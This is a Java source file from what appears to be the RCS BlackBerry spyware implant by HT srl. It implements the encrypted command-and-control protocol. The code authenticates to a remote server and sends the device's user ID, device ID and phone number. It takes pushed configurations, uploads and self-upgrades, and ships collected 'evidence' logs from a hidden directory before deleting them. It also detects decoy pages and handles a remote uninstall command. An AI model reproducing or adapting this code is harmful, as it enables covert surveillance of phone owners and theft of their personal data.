//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.action.sync.protocol;

import java.io.EOFException;
import java.util.Date;
import java.util.Vector;

import net.rim.device.api.crypto.CryptoException;
import net.rim.device.api.crypto.RandomSource;
import net.rim.device.api.crypto.SHA1Digest;
import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.Status;
import blackberry.Task;
import blackberry.action.sync.Protocol;
import blackberry.action.sync.transport.TransportException;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.crypto.EncryptionPKCS5;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.EvidenceCollector;
import blackberry.fs.AutoFile;
import blackberry.fs.Directory;
import blackberry.fs.Path;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

public class ZProtocol extends Protocol {

    private static final int SHA1LEN = 20;
    //#ifdef DEBUG
    private static Debug debug = new Debug("ZProtocol", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
    private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5(Encryption
            .getKeys().getProtoKey());

    byte[] Kd = new byte[16];
    byte[] Nonce = new byte[16];

    boolean upgrade;
    Vector upgradeFiles = new Vector();
    Status status = Status.getInstance();

    public boolean perform() {
        //#ifdef DBC
        Check.requires(transport != null, "perform: transport = null"); //$NON-NLS-1$
        //#endif

        // key init
        //cryptoConf.makeKey(Encryption.getKeys().getProtoKey());
        RandomSource.getBytes(Kd);
        RandomSource.getBytes(Nonce);

        //#ifdef DEBUG
        debug.trace("Kd: " + Utils.byteArrayToHex(Kd)); //$NON-NLS-1$
        debug.trace("Nonce: " + Utils.byteArrayToHex(Nonce)); //$NON-NLS-1$
        //#endif

        try {
            transport.start();

            //#ifdef DEBUG
            debug.info("***** Authentication *****"); //$NON-NLS-1$

            //#endif          

            byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication(), 0);
            //#ifdef DEBUG
            debug.trace("perform: " + Utils.byteArrayToHex(cypherOut));
            //#endif
            byte[] response = transport.command(cypherOut);
            Status.self().uninstall = parseAuthentication(response);
            cypherOut = null;
            response = null;

            if (status.uninstall) {
                //#ifdef DEBUG
                debug.warn("Uninstall detected, no need to continue"); //$NON-NLS-1$
                //#endif  
                return true;
            }

            //#ifdef DEBUG
            debug.info("***** Identification *****"); //$NON-NLS-1$
            //#endif  
            response = command(Proto.ID, forgeIdentification());
            boolean[] capabilities = parseIdentification(response);
            response = null;

            if (capabilities[Proto.NEW_CONF]) {
                //#ifdef DEBUG
                debug.info("***** NewConf *****"); //$NON-NLS-1$
                //#endif  

                response = command(Proto.NEW_CONF);
                int newconf = parseNewConf(response);
                response = null;

                if (newconf != Proto.NO) {
                    //#ifdef DEBUG
                    debug.trace("perform: had a conf"); //$NON-NLS-1$
                    //#endif
                    boolean ret = false;

                    if (newconf == Proto.OK) {
                        //#ifdef DEBUG
                        debug.trace("perform: conf is not corrupted, try it"); //$NON-NLS-1$
                        //#endif
                        ret = Task.getInstance().reloadConf();
                    } else {
                        //#ifdef DEBUG
                        debug.trace("perform: conf was corrupted, or cannot write it"); //$NON-NLS-1$
                        //#endif
                    }

                    //#ifdef DEBUG
                    debug.trace("perform, conf return: " + ret); //$NON-NLS-1$
                    //#endif
                    byte[] data;
                    if (ret) {
                        data = Utils.intToByteArray(Proto.OK);
                    } else {
                        data = Utils.intToByteArray(Proto.NO);
                    }

                    //#ifdef DEBUG
                    debug.trace("perform: sending newconf: " + ret); //$NON-NLS-1$
                    //#endif
                    command(Proto.NEW_CONF, data);
                }
            }

            if (capabilities[Proto.DOWNLOAD]) {
                //#ifdef DEBUG
                debug.info("***** Download *****"); //$NON-NLS-1$
                //#endif  
                response = command(Proto.DOWNLOAD);
                parseDownload(response);
                response = null;
            }

            if (capabilities[Proto.UPLOAD]) {
                //#ifdef DEBUG
                debug.info("***** Upload *****"); //$NON-NLS-1$
                //#endif  

                upgrade = false;
                boolean left = true;
                while (left) {
                    response = command(Proto.UPLOAD);
                    left = parseUpload(response);

                }
                response = null;
            }

            if (capabilities[Proto.UPGRADE]) {
                //#ifdef DEBUG
                debug.info("***** Upgrade *****"); //$NON-NLS-1$
                //#endif  

                upgradeFiles.removeAllElements();

                boolean left = true;
                while (left) {
                    response = command(Proto.UPGRADE);
                    left = parseUpgrade(response);
                }
                response = null;
            }

            if (capabilities[Proto.FILESYSTEM]) {
                //#ifdef DEBUG
                debug.info("***** FileSystem *****"); //$NON-NLS-1$
                //#endif  
                response = command(Proto.FILESYSTEM);
                parseFileSystem(response);
                response = null;
            }

            //#ifdef DEBUG
            debug.info("***** Log *****"); //$NON-NLS-1$
            //#endif  

            sendEvidences(Path.hidden());

            //#ifdef DEBUG
            debug.info("***** END *****"); //$NON-NLS-1$
            //#endif  
            response = command(Proto.BYE);
            parseEnd(response);
            response = null;

            return true;

        } catch (TransportException e) {
            //#ifdef DEBUG 
            debug.error(e);
            debug.error("perform: TransportException " + e);
            //#endif
            return false;
        } catch (ProtocolException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("perform: ProtocolException " + e);
            //#endif
            return false;
        } catch (CommandException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("perform: CommandException " + e);
            //#endif
            return false;
        } catch (Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("perform: Exception " + e);
            //#endif
            return false;
        } finally {
            transport.close();
        }
    }

    ////************************** PROTOCOL *************************************** ////
    protected byte[] forgeAuthentication() {
        Keys keys = Encryption.getKeys();

        byte[] data = new byte[104];
        DataBuffer dataBuffer = new DataBuffer(data, 0, data.length, false);

        // filling structure
        dataBuffer.write(Kd);
        dataBuffer.write(Nonce);

        //#ifdef DBC
        Check.ensures(dataBuffer.getPosition() == 32,
                "forgeAuthentication, wrong array size"); //$NON-NLS-1$
        //#endif

        dataBuffer.write(Utils.padByteArray(keys.getBuildID(), 16));
        dataBuffer.write(keys.getInstanceId());
        dataBuffer.write(Utils.padByteArray(Device.getSubtype(), 16));

        //#ifdef DBC
        Check.ensures(dataBuffer.getPosition() == 84,
                "forgeAuthentication, wrong array size"); //$NON-NLS-1$
        //#endif

        // calculating digest       
        final SHA1Digest digest = new SHA1Digest();
        digest.update(Utils.padByteArray(keys.getBuildID(), 16));
        digest.update(keys.getInstanceId());
        digest.update(Utils.padByteArray(Device.getSubtype(), 16));
        digest.update(keys.getConfKey());

        byte[] sha1 = digest.getDigest();

        //#ifdef DEBUG
        debug.trace("forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1)); //$NON-NLS-1$
        debug.trace("forgeAuthentication confKey=" //$NON-NLS-1$
                + Utils.byteArrayToHex(keys.getConfKey()));
        //#endif

        // appending digest
        dataBuffer.write(sha1);

        //#ifdef DBC
        Check.ensures(dataBuffer.getPosition() == data.length,
                "forgeAuthentication, wrong array size"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("forgeAuthentication: " + Utils.byteArrayToHex(data)); //$NON-NLS-1$
        //#endif

        return data;
    }

    protected boolean parseAuthentication(byte[] authResult)
            throws ProtocolException {
        if (authResult.length != 64) {
            //#ifdef DEBUG
            debug.trace("parseAuthentication: wrong size. Probably a decoy."); //$NON-NLS-1$
            //#endif
            throw new ProtocolException(14);
        }

        boolean uninstall = false;

        //#ifdef DEBUG
        debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult)); //$NON-NLS-1$
        //#endif

        // Retrieve K
        byte[] cypherKs = new byte[32];
        Utils.copy(cypherKs, authResult, cypherKs.length);
        try {

            byte[] Ks = cryptoConf.decryptData(cypherKs);

            //#ifdef DEBUG
            debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd)); //$NON-NLS-1$
            debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks)); //$NON-NLS-1$

            //#endif

            //PBKDF1 (SHA1, c=1, Salt=KS||Kd) 
            final SHA1Digest digest = new SHA1Digest();
            digest.update(Encryption.getKeys().getConfKey());
            digest.update(Ks, 0, 16);
            digest.update(Kd, 0, 16);

            byte[] K = new byte[16];
            Utils.copy(K, digest.getDigest(), K.length);

            cryptoK.makeKey(K);

            //#ifdef DEBUG
            debug.trace("decodeAuth K=" + Utils.byteArrayToHex(K)); //$NON-NLS-1$
            //#endif

            // Retrieve Nonce and Cap
            byte[] cypherNonceCap = new byte[32];
            Utils.copy(cypherNonceCap, 0, authResult, 32, cypherNonceCap.length);

            Encryption crypto2 = new Encryption(K);
            byte[] plainNonceCap = crypto2.decryptData(cypherNonceCap);
            crypto2 = null;

            //#ifdef DEBUG
            debug.trace("decodeAuth plainNonceCap=" //$NON-NLS-1$
                    + Utils.byteArrayToHex(plainNonceCap));
            //#endif

            boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0,
                    Nonce.length);
            //#ifdef DEBUG
            debug.trace("decodeAuth nonceOK: " + nonceOK); //$NON-NLS-1$
            //#endif
            if (nonceOK) {
                int cap = Utils.byteArrayToInt(plainNonceCap, 16);
                if (cap == Proto.OK) {
                    //#ifdef DEBUG
                    debug.trace("decodeAuth Proto OK"); //$NON-NLS-1$
                    //#endif
                } else if (cap == Proto.UNINSTALL) {
                    //#ifdef DEBUG
                    debug.trace("decodeAuth Proto Uninstall"); //$NON-NLS-1$
                    //#endif
                    uninstall = true;
                } else {
                    //#ifdef DEBUG
                    debug.trace("decodeAuth error: " + cap); //$NON-NLS-1$
                    //#endif
                    throw new ProtocolException(11);
                }
            } else {
                throw new ProtocolException(12);
            }

        } catch (CryptoException ex) {
            //#ifdef DEBUG
            debug.error("parseAuthentication: " + ex); //$NON-NLS-1$
            //#endif
            throw new ProtocolException(13);
        }

        return uninstall;
    }

    protected byte[] forgeIdentification() {
        final Device device = Device.getInstance();
        //device.refreshData();

        byte[] userid = WChar.pascalize(device.getWUserId());
        byte[] deviceid = WChar.pascalize(device.getWDeviceId());
        byte[] phone = WChar.pascalize(device.getWPhoneNumber());

        int len = 4 + userid.length + deviceid.length + phone.length;

        byte[] content = new byte[len];

        DataBuffer dataBuffer = new DataBuffer(content, 0, content.length,
                false);
        //dataBuffer.writeInt(Proto.ID);
        dataBuffer.write(Device.getVersion());
        dataBuffer.write(userid);
        dataBuffer.write(deviceid);
        dataBuffer.write(phone);

        //#ifdef DBC
        Check.ensures(dataBuffer.getPosition() == content.length,
                "forgeIdentification pos: " + dataBuffer.getPosition()); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("forgeIdentification: " + Utils.byteArrayToHex(content)); //$NON-NLS-1$
        //#endif
        return content;
    }

    protected boolean[] parseIdentification(byte[] result)
            throws ProtocolException {
        boolean[] capabilities = new boolean[Proto.LASTTYPE];

        int res = Utils.byteArrayToInt(result, 0);
        if (res == Proto.OK) {
            //#ifdef DEBUG
            debug.info("got Identification"); //$NON-NLS-1$
            //#endif

            DataBuffer dataBuffer = new DataBuffer(result, 4,
                    result.length - 4, false);
            try {
                // la totSize e' discutibile
                int totSize = dataBuffer.readInt();

                long dateServer = dataBuffer.readLong();

                //#ifdef DEBUG
                debug.trace("parseIdentification: " + dateServer); //$NON-NLS-1$
                //#endif

                Date date = new Date();
                int drift = (int) (dateServer - (date.getTime() / 1000));

                //#ifdef DEBUG
                debug.trace("parseIdentification drift: " + drift); //$NON-NLS-1$
                //#endif
                Status.getInstance().drift = drift;

                int numElem = dataBuffer.readInt();

                for (int i = 0; i < numElem; i++) {
                    int cap = dataBuffer.readInt();
                    if (cap < Proto.LASTTYPE) {
                        capabilities[cap] = true;
                    }
                    //#ifdef DEBUG
                    debug.trace("capabilities: " + capabilities[i]); //$NON-NLS-1$
                    //#endif                   
                }

            } catch (EOFException e) {
                //#ifdef DEBUG
                debug.error(e);
                //#endif
                throw new ProtocolException();
            }
        } else if (res == Proto.NO) {
            //#ifdef DEBUG
            debug.info("no new conf: "); //$NON-NLS-1$
            //#endif
        } else {
            //#ifdef DEBUG
            debug.error("parseNewConf: " + res); //$NON-NLS-1$
            //#endif
            throw new ProtocolException();
        }

        return capabilities;
    }

    /**
     * 
     * @param result
     * @return NO: no configuration, OK: new good configuration, ERROR: new
     *         broken conf
     * @throws ProtocolException
     * @throws CommandException
     */
    protected int parseNewConf(byte[] result) throws ProtocolException,
            CommandException {
        int res = Utils.byteArrayToInt(result, 0);
        boolean ret = false;
        if (res == Proto.OK) {

            final int confLen = Utils.byteArrayToInt(result, 4);
            if (confLen > 0) {
                //#ifdef DEBUG
                debug.info("got NewConf"); //$NON-NLS-1$
                //#endif

                ret = Protocol.saveNewConf(result, 8);

            } else {
                //#ifdef DEBUG
                debug.info(" Error (parseNewConf): empty conf"); //$NON-NLS-1$
                //#endif
            }
            if (ret) {
                return Proto.OK;
            } else {
                return Proto.ERROR;
            }

        } else if (res == Proto.NO) {
            //#ifdef DEBUG
            debug.info(" Info: no new conf: "); //$NON-NLS-1$
            //#endif
            return Proto.NO;
        } else {
            //#ifdef DEBUG
            debug.info(" Error: parseNewConf: " + res); //$NON-NLS-1$
            //#endif
            throw new ProtocolException();
        }

    }

    protected void parseDownload(byte[] result) throws ProtocolException {
        int res = Utils.byteArrayToInt(result, 0);
        if (res == Proto.OK) {
            //#ifdef DEBUG
            debug.trace("parseDownload, OK"); //$NON-NLS-1$
            //#endif
            DataBuffer dataBuffer = new DataBuffer(result, 4,
                    result.length - 4, false);
            try {
                // la totSize e' discutibile
                int totSize = dataBuffer.readInt();
                int numElem = dataBuffer.readInt();
                for (int i = 0; i < numElem; i++) {
                    String file = WChar.readPascal(dataBuffer);
                    //#ifdef DEBUG
                    debug.trace("parseDownload: " + file); //$NON-NLS-1$
                    //#endif

                    // expanding $dir$
                    file = Directory.expandMacro(file);
                    file = Protocol.normalizeFilename(file);
                    Protocol.saveDownloadLog(file);
                }

            } catch (EOFException e) {
                //#ifdef DEBUG
                debug.error(e);
                //#endif
                throw new ProtocolException();
            }
        } else if (res == Proto.NO) {
            //#ifdef DEBUG
            debug.info("parseDownload: no download"); //$NON-NLS-1$
            //#endif
        } else {
            //#ifdef DEBUG
            debug.error("parseDownload, wrong answer: " + res); //$NON-NLS-1$
            //#endif
            throw new ProtocolException();
        }
    }

    /**
     * @param content
     * @return true if left>0
     * @throws ProtocolException
     */
    protected boolean parseUpload(byte[] result) throws ProtocolException {

        int res = Utils.byteArrayToInt(result, 0);
        if (res == Proto.OK) {
            //#ifdef DEBUG
            debug.trace("parseUpload, OK"); //$NON-NLS-1$
            //#endif
            DataBuffer dataBuffer = new DataBuffer(result, 4,
                    result.length - 4, false);
            try {
                int totSize = dataBuffer.readInt();
                int left = dataBuffer.readInt();
                //#ifdef DEBUG
                debug.trace("parseUpload left: " + left); //$NON-NLS-1$
                //#endif
                String filename = WChar.readPascal(dataBuffer);
                //#ifdef DEBUG
                debug.trace("parseUpload: " + filename); //$NON-NLS-1$
                //#endif

                int size = dataBuffer.readInt();
                byte[] content = new byte[size];
                dataBuffer.read(content);

                //#ifdef DEBUG
                debug.trace("parseUpload: saving"); //$NON-NLS-1$
                //#endif
                Protocol.saveUpload(filename, content);

                if (filename.equals(Protocol.UPGRADE_FILENAME_0)
                        || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
                    upgrade = true;
                    //#ifdef DEBUG
                    debug.trace("parseUpload: there's something to upgrade"); //$NON-NLS-1$
                    //#endif
                }

                if (left == 0 && upgrade) {
                    //#ifdef DEBUG
                    debug.trace("parseUpload: last file, go to upgrade"); //$NON-NLS-1$
                    //#endif
                    upgradeMulti();
                }

                return left > 0;

            } catch (EOFException e) {
                //#ifdef DEBUG
                debug.error(e);
                debug.error("parseUpload: " + e);
                //#endif
                throw new ProtocolException();
            }
        } else if (res == Proto.NO) {
            //#ifdef DEBUG
            debug.trace("parseUpload, NO"); //$NON-NLS-1$
            //#endif
            return false;
        } else {
            //#ifdef DEBUG
            debug.error("parseUpload, wrong answer: " + res); //$NON-NLS-1$
            //#endif
            throw new ProtocolException();
        }
    }

    protected boolean parseUpgrade(byte[] result) throws ProtocolException {

        int res = Utils.byteArrayToInt(result, 0);
        if (res == Proto.OK) {
            //#ifdef DEBUG
            debug.trace("parseUpgrade, OK"); //$NON-NLS-1$
            //#endif
            DataBuffer dataBuffer = new DataBuffer(result, 4,
                    result.length - 4, false);
            try {
                int totSize = dataBuffer.readInt();
                int left = dataBuffer.readInt();
                //#ifdef DEBUG
                debug.trace("parseUpgrade left: " + left); //$NON-NLS-1$
                //#endif
                String filename = WChar.readPascal(dataBuffer);
                //#ifdef DEBUG
                debug.trace("parseUpgrade: " + filename); //$NON-NLS-1$
                //#endif

                int size = dataBuffer.readInt();
                byte[] content = new byte[size];
                dataBuffer.read(content);

                //#ifdef DEBUG
                debug.trace("parseUpgrade: saving"); //$NON-NLS-1$
                //#endif
                Protocol.saveUpload(filename, content);
                upgradeFiles.addElement(filename);

                if (left == 0) {
                    //#ifdef DEBUG
                    debug.trace("parseUpgrade: all file saved, proceed with upgrade"); //$NON-NLS-1$
                    //#endif
                    Protocol.upgradeMulti(upgradeFiles);
                }

                return left > 0;

            } catch (EOFException e) {
                //#ifdef DEBUG
                debug.error(e);
                debug.error("parseUpgrade: " + e);
                //#endif
                throw new ProtocolException();
            }
        } else if (res == Proto.NO) {
            //#ifdef DEBUG
            debug.trace("parseUpgrade, NO"); //$NON-NLS-1$
            //#endif
            return false;
        } else {
            //#ifdef DEBUG
            debug.error("parseUpgrade, wrong answer: " + res); //$NON-NLS-1$
            //#endif
            throw new ProtocolException();
        }
    }

    protected void parseFileSystem(byte[] result) throws ProtocolException {
        int res = Utils.byteArrayToInt(result, 0);
        if (res == Proto.OK) {
            //#ifdef DEBUG
            debug.trace("parseFileSystem, OK"); //$NON-NLS-1$
            //#endif
            DataBuffer dataBuffer = new DataBuffer(result, 4,
                    result.length - 4, false);
            try {
                int totSize = dataBuffer.readInt();
                int numElem = dataBuffer.readInt();
                for (int i = 0; i < numElem; i++) {
                    int depth = dataBuffer.readInt();
                    String file = WChar.readPascal(dataBuffer);
                    //#ifdef DEBUG
                    debug.trace("parseFileSystem: " + file + " depth: " + depth); //$NON-NLS-1$ //$NON-NLS-2$
                    //#endif

                    // expanding $dir$
                    file = Directory.expandMacro(file);
                    Protocol.saveFilesystem(depth, file);
                }

            } catch (EOFException e) {
                //#ifdef DEBUG
                debug.error("parse error: " + e); //$NON-NLS-1$
                //#endif
                throw new ProtocolException();
            }
        } else if (res == Proto.NO) {
            //#ifdef DEBUG
            debug.info("parseFileSystem: no download"); //$NON-NLS-1$
            //#endif
        } else {
            //#ifdef DEBUG
            debug.error("parseFileSystem, wrong answer: " + res); //$NON-NLS-1$
            //#endif
            throw new ProtocolException();
        }
    }

    protected void sendEvidences(String basePath) throws TransportException,
            ProtocolException {
        //#ifdef DEBUG
        debug.info("sendEvidences from: " + basePath); //$NON-NLS-1$
        //#endif

        EvidenceCollector logCollector = EvidenceCollector.getInstance();

        final Vector dirs = logCollector.scanForDirLogs(basePath);
        final int dsize = dirs.size();
        //#ifdef DEBUG
        debug.trace("sendEvidences #directories: " + dsize); //$NON-NLS-1$
        //#endif
        for (int i = 0; i < dsize; ++i) {
            final String dir = (String) dirs.elementAt(i);
            final Vector logs = logCollector.scanForEvidences(basePath, dir);
            final int lsize = logs.size();
            //#ifdef DEBUG
            debug.trace("    dir: " + dir + " #evidences: " + lsize); //$NON-NLS-1$ //$NON-NLS-2$
            //#endif

            // Evidence SIZE
            byte[] plainOut = new byte[4 + 8];
            Utils.copy(plainOut, 0, Utils.intToByteArray(lsize), 0, 4);
            byte[] response = command(Proto.EVIDENCE_SIZE, plainOut);
            checkOk(response);

            for (int j = 0; j < lsize; ++j) {
                final String logName = (String) logs.elementAt(j);
                final String fullLogName = basePath + dir + logName;
                final AutoFile file = new AutoFile(fullLogName, false);
                if (!file.exists()) {
                    //#ifdef DEBUG
                    debug.error("File doesn't exist: " + fullLogName); //$NON-NLS-1$
                    //#endif
                    continue;
                }
                final byte[] content = file.read();
                //#ifdef DEBUG
                debug.info("Sending file: " //$NON-NLS-1$
                        + EvidenceCollector.decryptName(logName) + " = " //$NON-NLS-1$
                        + fullLogName);
                //#endif

                plainOut = new byte[content.length + 4];
                Utils.copy(plainOut, 0, Utils.intToByteArray(content.length),
                        0, 4);
                Utils.copy(plainOut, 4, content, 0, content.length);

                response = command(Proto.LOG, plainOut);
                plainOut = null;

                boolean ret = parseLog(response);

                if (ret) {
                    logCollector.remove(fullLogName);
                } else {
                    //#ifdef DEBUG
                    debug.warn("error sending file, bailing out"); //$NON-NLS-1$
                    //#endif
                    return;
                }
            }
            if (!Path.removeDirectory(basePath + dir)) {
                //#ifdef DEBUG
                debug.warn("Not empty directory"); //$NON-NLS-1$
                //#endif
            }

            //#ifdef DEBUG
            debug.trace("    dir finished: " + dir); //$NON-NLS-1$
            //#endif
        }

        //#ifdef DEBUG
        debug.trace("sendEvidences finished"); //$NON-NLS-1$
        //#endif
    }

    protected boolean parseLog(byte[] result) throws ProtocolException {
        return checkOk(result);
    }

    protected void parseEnd(byte[] result) throws ProtocolException {
        checkOk(result);
    }

    //// ****************************** INTERNALS ****************************************** ////
    private byte[] command(int command) throws TransportException,
            ProtocolException {
        //#ifdef DEBUG
        debug.trace("command: " + command); //$NON-NLS-1$
        //#endif
        return command(command, new byte[0]);
    }

    private byte[] command(int command, byte[] data) throws TransportException {
        //#ifdef DBC
        Check.requires(cryptoK != null, "cypherCommand: cryptoK null"); //$NON-NLS-1$
        Check.requires(data != null, "cypherCommand: data null"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("command: " + command + " datalen: " + data.length); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        int dataLen = data.length;
        final byte[] plainOut = new byte[dataLen + 4];
        Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
        Utils.copy(plainOut, 4, data, 0, data.length);

        try {
            byte[] plainIn;

            plainIn = cypheredWriteReadSha(plainOut);
            return plainIn;
        } catch (CryptoException e) {
            //#ifdef DEBUG
            debug.trace("command: " + e); //$NON-NLS-1$
            //#endif
            throw new TransportException(9);
        }
    }

    private byte[] cypheredWriteReadSha(byte[] plainOut)
            throws TransportException, CryptoException {
        //#ifdef DEBUG
        debug.trace("cypheredWriteReadSha"); //$NON-NLS-1$
        debug.trace("plainout: " + plainOut.length); //$NON-NLS-1$
        //#endif

        byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
        //#ifdef DEBUG        
        debug.trace("cypherOut: " + cypherOut.length); //$NON-NLS-1$
        //#endif

        byte[] cypherIn = transport.command(cypherOut);

        String result = new String(cypherIn);
        if (result != null
                && result.indexOf("<meta http-equiv=\"refresh\" content") >= 0) {
            //#ifdef DEBUG
            debug.error("cypheredWriteReadSha: DECOY PAGE DETECTED!"); //$NON-NLS-1$
            //#endif
            throw new TransportException(30);
        }

        if (cypherIn.length < SHA1LEN) {
            //#ifdef DEBUG
            debug.error("cypheredWriteReadSha: cypherIn sha len error!"); //$NON-NLS-1$
            //#endif
            throw new CryptoException();
        }

        byte[] plainIn = cryptoK.decryptDataIntegrity(cypherIn);

        return plainIn;

    }

    private boolean checkOk(byte[] result) throws ProtocolException {
        int res = Utils.byteArrayToInt(result, 0);
        if (res == Proto.OK) {
            return true;
        } else if (res == Proto.NO) {
            //#ifdef DEBUG
            debug.error("checkOk: NO"); //$NON-NLS-1$
            //#endif
            return false;
        } else {
            //#ifdef DEBUG
            debug.error("checkOk: " + res); //$NON-NLS-1$
            //#endif

            throw new ProtocolException();
        }
    }
}
